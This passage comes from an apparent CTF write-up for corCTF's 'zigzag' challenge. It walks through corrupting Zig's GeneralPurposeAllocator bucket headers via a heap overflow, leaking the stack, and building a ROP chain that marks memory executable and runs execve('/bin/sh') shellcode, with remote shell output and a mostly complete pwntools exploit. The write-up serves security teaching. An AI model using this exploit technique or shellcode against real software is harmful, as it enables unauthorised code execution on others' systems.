    <span style="color:#66d9ef">const</span> bucket_index <span style="color:#f92672">=</span> math.log2(size_class);
    <span style="color:#66d9ef">const</span> first_bucket <span style="color:#f92672">=</span> self.buckets[bucket_index] orelse <span style="color:#66d9ef">try</span> self.createBucket(
        size_class,
        bucket_index,
    );
    var bucket <span style="color:#f92672">=</span> first_bucket;
    <span style="color:#66d9ef">const</span> slot_count <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>divExact(page_size, size_class);
    <span style="color:#66d9ef">while</span> (bucket.alloc_cursor <span style="color:#f92672">==</span> slot_count) {
        <span style="color:#66d9ef">const</span> prev_bucket <span style="color:#f92672">=</span> bucket;
        bucket <span style="color:#f92672">=</span> prev_bucket.next;
        <span style="color:#66d9ef">if</span> (bucket <span style="color:#f92672">==</span> first_bucket) {
            <span style="color:#75715e">// make a new one
</span><span style="color:#75715e"></span>            bucket <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> self.createBucket(size_class, bucket_index);
            bucket.prev <span style="color:#f92672">=</span> prev_bucket;
            bucket.next <span style="color:#f92672">=</span> prev_bucket.next;
            prev_bucket.next <span style="color:#f92672">=</span> bucket;
            bucket.next.prev <span style="color:#f92672">=</span> bucket;
        }
    }
    <span style="color:#75715e">// change the allocator&#39;s current bucket to be this one
</span><span style="color:#75715e"></span>    self.buckets[bucket_index] <span style="color:#f92672">=</span> bucket;

    <span style="color:#66d9ef">const</span> slot_index <span style="color:#f92672">=</span> bucket.alloc_cursor;
    bucket.alloc_cursor <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;

    var used_bits_byte <span style="color:#f92672">=</span> bucket.usedBits(slot_index <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>);
    <span style="color:#66d9ef">const</span> used_bit_index: <span style="color:#a6e22e">u3</span> <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>intCast(u3, slot_index <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span>); <span style="color:#75715e">// TODO cast should be unnecessary
</span><span style="color:#75715e"></span>    used_bits_byte.<span style="color:#f92672">*</span> <span style="color:#f92672">|=</span> (<span style="color:#f92672">@</span><span style="color:#66d9ef">as</span>(<span style="color:#66d9ef">u8</span>, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&lt;&lt;</span> used_bit_index);
    bucket.used_count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
    bucket.captureStackTrace(trace_addr, size_class, slot_index, .alloc);
    <span style="color:#66d9ef">return</span> bucket.page <span style="color:#f92672">+</span> slot_index <span style="color:#f92672">*</span> size_class;
}
</code></pre></div><p><code>allocSlot</code> will check if the current bucket is able to allocate one more object, else it will iterate through the doubly linked list to look for a not full bucket.
And if it does nto find one, it creates a new bucket. When the bucket is allocated, it returns the available objet at <code>bucket.page + slot_index * size_class</code>.</p>
<p>As you can see, the <code>BucketHeader</code> is structured like below in the <code>createBucket</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">createBucket</span>(self: <span style="color:#f92672">*</span>Self, size_class: <span style="color:#66d9ef">usize</span>, bucket_index: <span style="color:#66d9ef">usize</span>) Error<span style="color:#f92672">!*</span>BucketHeader {
    <span style="color:#66d9ef">const</span> page <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> self.backing_allocator.allocAdvanced(<span style="color:#66d9ef">u8</span>, page_size, page_size, .exact);
    errdefer self.backing_allocator.free(page);

    <span style="color:#66d9ef">const</span> bucket_size <span style="color:#f92672">=</span> bucketSize(size_class);
    <span style="color:#66d9ef">const</span> bucket_bytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> self.backing_allocator.allocAdvanced(<span style="color:#66d9ef">u8</span>, <span style="color:#f92672">@</span>alignOf(BucketHeader), bucket_size, .exact);
    <span style="color:#66d9ef">const</span> ptr <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>ptrCast(<span style="color:#f92672">*</span>BucketHeader, bucket_bytes.ptr);
    ptr.<span style="color:#f92672">*</span> <span style="color:#f92672">=</span> BucketHeader{
        .prev <span style="color:#f92672">=</span> ptr,
        .next <span style="color:#f92672">=</span> ptr,
        .page <span style="color:#f92672">=</span> page.ptr,
        .alloc_cursor <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
        .used_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
    };
    self.buckets[bucket_index] <span style="color:#f92672">=</span> ptr;
    <span style="color:#75715e">// Set the used bits to all zeroes
</span><span style="color:#75715e"></span>    <span style="color:#f92672">@</span>memset(<span style="color:#f92672">@</span><span style="color:#66d9ef">as</span>(<span style="color:#f92672">*</span>[<span style="color:#ae81ff">1</span>]<span style="color:#66d9ef">u8</span>, ptr.usedBits(<span style="color:#ae81ff">0</span>)), <span style="color:#ae81ff">0</span>, usedBitsCount(size_class));
    <span style="color:#66d9ef">return</span> ptr;
}
</code></pre></div><p>It allocates a page to store objects in, then it allocates the <code>BucketHeader</code> itself. Note that the page allocator will make allocations adjacent from each other. According to my several experiments the allocations grow &ndash; from an initial given mapping &ndash; to lower or higher addresses. I advice you to try different order of allocations in gdb to figure out this.</p>
<p>Let&rsquo;s quickly decribe each field of the <code>BucketHeader</code>:</p>
<ul>
<li><code>.prev</code> and <code>.next</code> keep track of the doubly linked list that links buckets of same size.</li>
<li><code>.page</code> contains the base address of the page that contains the objects that belong to the bucket.</li>
<li><code>alloc_cursor</code> contains the number of allocated objects.</li>
<li><code>used_count</code> contains the number of currently used objects.</li>
</ul>
<h2 id="getting-read--write-what-were-primitive">Getting read / write what were primitive</h2>
<p>Well, the goal is to an arbitrary read / write by hiijacking the <code>.page</code> and <code>.alloc_cursor</code> fields of the <code>BucketHeader</code>, this way if we hiijack pointers from a currently used bucket for a given size we can get a chunk toward any location.</p>
<p>What we can do to get a chunk close to a  <code>BucketHeader</code> structure would be:</p>
<ul>
<li>Allocate large (<code>0x500-1</code>) chunk, <code>0x800</code> bucket.</li>
<li>Allocate 4 other chunks of size <code>1000</code>, which end up in the <code>0x400</code> bucket.</li>
</ul>
<p>Thus, first one page has been allocated to satisfy request one, then another page right after the other has been allocated to store the <code>BucketHeader</code> for this bucket.
Then, to satisfy the four next allocations, the page that stores the objects has been allocated right after the one which stores the <code>BucketHeader</code> of the <code>0x800</code>-bucket, and finally a page is allocated to store the <code>BucketHeader</code> of the <code>0x400</code> bucket.</p>
<p>If you do not understand clearly, I advice you to debug my exploit in <code>gdb</code> by looking at the <code>chunklist</code>.</p>
<p>With this process the last allocated <code>0x400</code>-sized chunk gets allocated <code>0x400</code> bytes before the <code>BucketHeader</code> of the bucket that handles <code>0x400</code>-sized chunks.
Thus to get a read / write what were we can simply trigger the heap overflow with the <code>edit</code> function to null out <code>.alloc_cursor</code> and <code>.used_count</code> and replace <code>.page</code> by the target location.
This way the next allocation that will request <code>0x400</code> bytes, which will trigger the hiijacked bucket and return the target location giving us the primitive.</p>
<p>Which gives:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">alloc(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x500</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>):
    alloc(i, <span style="color:#ae81ff">1000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;vv&#34;</span>)

edit(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span> \ <span style="color:#75715e"># padding</span>
     <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x208000</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> \ <span style="color:#75715e"># next / prev + .page point toward the target =&gt; 0x208000</span>
     <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x0</span>) \ <span style="color:#75715e"># .alloc_cursor &amp; .used_count</span>
     <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>)) <span style="color:#75715e"># used bits</span>

<span style="color:#75715e"># next alloc(1000) will trigger the write what were</span>
</code></pre></div><h2 id="leak-stack">Leak stack</h2>
<p>To leak the stack I leaked the <code>argv</code> variable that contains a pointer toward arguments given to the program, stored on the stack. That&rsquo;s a reliable leak given it&rsquo;s a known and fixed location, which can base used as a base compared with function&rsquo;s stackframes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">alloc(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">1000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>) <span style="color:#75715e"># get chunk into target location (0x208000)</span>
show(<span style="color:#ae81ff">5</span>)
io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x100</span>) <span style="color:#75715e"># argv is located at 0x208000 + 0x100</span>

stack <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>))
pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;stack: </span><span style="color:#e6db74">{</span>hex(stack)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</code></pre></div><h2 id="rop">ROP</h2>
<p>Now we&rsquo;re able to overwrite whatever function&rsquo;s stackframe, we have to find one that returns from context of <code>std.fs.file.File.read</code> that reads the user input to the chunk. But unlucky functions like <code>add</code>, <code>edit</code> are inlined in the <code>main</code> function. Moreover we cannot overwrite the return address of the <code>main</code> function given that the exit handler call directly exit. Which means we have to corrput the stackframe of the <code>std.fs.file.File.read</code> function called in the <code>edit</code> function.
But the issue is that between the call to <code>SYS_read</code> within <code>std.fs.file.File.read</code> and the end of the function, variables that belong to the calling function&rsquo;s stackframe are edited, corrupting the ROPchain. So what I did is using this gadget to reach a part of the stack that will not be corrupted:</p>
<pre tabindex="0"><code>0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
</code></pre><p>With the use of this gadget I&rsquo;m able to pop a few QWORD from the stack to reach another area of the stack where I write my ROPchain.
The goal for the ROPchain is to <code>mptotect</code> a shellcode and then jump on it. The issue is that I didn&rsquo;t find a gadget to control the value of the <code>rdx</code> register but when it returns from <code>std.fs.file.File.read</code> it contains the value of size given to <code>edit</code>. So to call <code>mprotect(rdi=0x208000, rsi=0x1000, rdx=0x7)</code> we have to call <code>edit</code> with a size of <code>7</code> to write on the <code>std.fs.file.File.read</code> saved RIP the value of the magic gadget seen previously.</p>
<p>Here is the ROPchain:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">edit(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x208000</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x000</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>))
<span style="color:#75715e"># with the use of the write what were we write the shellcode at 0x208000</span>

shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span style="color:#e6db74">&#34;</span>
<span style="color:#75715e"># execve(&#34;/bin/sh&#34;, NULL, NULL)</span>

alloc(<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1000</span>, shellcode)

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">0x0000000000201fcf : pop rax ; syscall
</span><span style="color:#e6db74">0x0000000000203147 : pop rdi ; ret
</span><span style="color:#e6db74">0x000000000020351b : pop rsi ; ret
</span><span style="color:#e6db74">0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ; syscall
</span><span style="color:#e6db74">0x0000000000201e09 : ret
</span><span style="color:#e6db74">0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

edit(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(stack<span style="color:#f92672">-</span><span style="color:#ae81ff">0x50</span>)<span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>))
<span style="color:#75715e"># write ROPchain into the safe area on the stack </span>
alloc(<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0x400</span>, pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x203147</span>) \ <span style="color:#75715e"># pop rdi ; ret</span>
        <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x208000</span>) <span style="color:#f92672">+</span> \ <span style="color:#75715e"># target area for the shellcode</span>
        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x20351b</span>) <span style="color:#f92672">+</span> \ <span style="color:#75715e"># pop rsi ; ret</span>
        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x1000</span>) <span style="color:#f92672">+</span> \ <span style="color:#75715e"># length</span>
        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x201fcf</span>) <span style="color:#f92672">+</span> \ <span style="color:#75715e"># pop rax ; syscall</span>
        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0xa</span>) <span style="color:#f92672">+</span> \ <span style="color:#75715e"># SYS_mprotect</span>
        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x208000</span>)) <span style="color:#75715e"># jump on the shellcode + PROFIT</span>

edit(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(stack<span style="color:#f92672">-</span><span style="color:#ae81ff">0xd0</span>)<span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>))

alloc(<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1000</span>, pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x202d16</span>)) <span style="color:#75715e"># valid return address</span>
edit(<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0x7</span>, pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x0000000000203715</span>)) <span style="color:#75715e"># magic gadget</span>

io<span style="color:#f92672">.</span>interactive()
</code></pre></div><h2 id="profit">PROFIT</h2>
<pre tabindex="0"><code>nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax PORT=31278
[*] '/home/nasm/Documents/pwn/corCTF/zieg/zigzag'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x200000)
[+] Opening connection to be.ax on port 31278: Done
[*] stack: 0x7ffc2ca48ae8
[*] Loaded 37 cached gadgets for 'zigzag'
[*] Using sigreturn for 'SYS_execve'
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag.txt
zigzag
$ cat flag.txt
corctf{bl4Z1nGlY_f4sT!!}
</code></pre><h2 id="appendices">Appendices</h2>
<p>Final exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#75715e"># -*- coding: utf-8 -*-</span>

<span style="color:#75715e"># this exploit was generated via</span>
<span style="color:#75715e"># 1) pwntools</span>
<span style="color:#75715e"># 2) ctfmate</span>

<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> pwn


<span style="color:#75715e"># Set up pwntools for the correct architecture</span>
exe <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(<span style="color:#e6db74">&#39;zigzag&#39;</span>)
<span style="color:#75715e"># pwn.context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;] </span>
pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>delete_corefiles <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>rename_corefiles <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>

host <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>HOST <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
port <span style="color:#f92672">=</span> int(pwn<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>PORT <span style="color:#f92672">or</span> <span style="color:#ae81ff">1337</span>)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">local</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> pwn<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>GDB:
        <span style="color:#66d9ef">return</span> pwn<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> pwn<span style="color:#f92672">.</span>process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remote</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    io <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>connect(host, port)
    <span style="color:#66d9ef">if</span> pwn<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>GDB:
        pwn<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>attach(io, gdbscript<span style="color:#f92672">=</span>gdbscript)
    <span style="color:#66d9ef">return</span> io


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> pwn<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>LOCAL:
        <span style="color:#66d9ef">return</span> local(argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> remote(argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)


gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">source ~/Downloads/pwndbg/gdbinit.py
</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())

io <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>

io <span style="color:#f92672">=</span> start()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">alloc</span>(idx, size, data):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Index: &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Size: &#34;</span>, str(size)<span style="color:#f92672">.</span>encode())
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Data: &#34;</span>, data)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(idx):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Index: &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Index: &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, size, data):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Index: &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Size: &#34;</span>, str(size)<span style="color:#f92672">.</span>encode())
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Data: &#34;</span>, data)

alloc(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x500</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>):
    alloc(i, <span style="color:#ae81ff">1000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;vv&#34;</span>)

edit(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x208000</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x000</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>))

alloc(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">1000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
show(<span style="color:#ae81ff">5</span>)
io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x100</span>)

stack <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>))
pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;stack: </span><span style="color:#e6db74">{</span>hex(stack)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

edit(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x208000</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x000</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>))

shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span style="color:#e6db74">&#34;</span>

alloc(<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1000</span>, shellcode)

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">0x0000000000201fcf : pop rax ; syscall
</span><span style="color:#e6db74">0x0000000000203147 : pop rdi ; ret
</span><span style="color:#e6db74">0x000000000020351b : pop rsi ; ret
</span><span style="color:#e6db74">0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ; syscall
</span><span style="color:#e6db74">0x0000000000201e09 : ret
</span><span style="color:#e6db74">0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

rop <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ROP(exe)
binsh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x208000</span><span style="color:#f92672">+</span>(<span style="color:#ae81ff">48</span>)
rop<span style="color:#f92672">.</span>execve(binsh, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)

edit(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(stack<span style="color:#f92672">-</span><span style="color:#ae81ff">0x50</span>)<span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>))
